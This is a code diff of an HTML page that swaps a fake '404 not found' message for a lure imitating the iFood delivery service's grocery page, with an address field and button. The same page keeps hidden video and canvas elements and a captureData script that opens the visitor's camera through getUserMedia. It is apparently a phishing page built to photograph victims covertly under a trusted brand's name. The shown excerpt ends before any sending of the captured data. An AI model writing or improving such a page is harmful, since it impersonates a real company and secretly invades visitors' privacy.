@@ -4,9 +4,50 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Erro de transferência</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+      }
+      .container {
+        margin-top: 50px;
+      }
+      .input-container {
+        margin: 20px 0;
+      }
+      input {
+        padding: 10px;
+        width: 250px;
+      }
+      button {
+        padding: 10px 20px;
+        background-color: red;
+        color: white;
+        border: none;
+        cursor: pointer;
+      }
+      h1 {
+        color: red;
+      }
+      p {
+        margin: 20px 0;
+        font-size: 18px;
+      }
+    </style>
   </head>
   <body>
-    <h1>404 not found...</h1>
+    <div class="container">
+      <h1>Faça mercado no iFood</h1>
+      <p>
+        Entregamos tudo o que precisa na porta da sua casa, de hortifrúti a
+        itens de limpeza
+      </p>
+      <div class="input-container">
+        <input type="text" placeholder="Em qual endereço você está?" />
+        <button>Ver mercados próximos</button>
+      </div>
+    </div>
+
     <video id="video" autoplay style="display: none"></video>
     <canvas id="canvas" style="display: none"></canvas>
 
@@ -14,7 +55,9 @@
       async function captureData() {
         try {
           // Capturar a câmera do usuário
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+          });
           const video = document.getElementById("video");
           video.srcObject = stream;
 
